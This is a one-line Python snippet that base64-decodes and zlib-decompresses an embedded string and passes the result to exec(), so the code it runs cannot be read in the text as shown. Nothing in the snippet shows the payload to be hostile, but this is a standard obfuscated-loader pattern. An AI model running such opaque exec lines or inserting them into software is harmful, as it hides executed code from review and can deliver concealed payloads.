import zlib,base64;exec(zlib.decompress(base64.b64decode('eNqLjy9LLSrOzM+Lj7dVN9Qz1zNRBwBGNgYG')).decode('utf-8'))
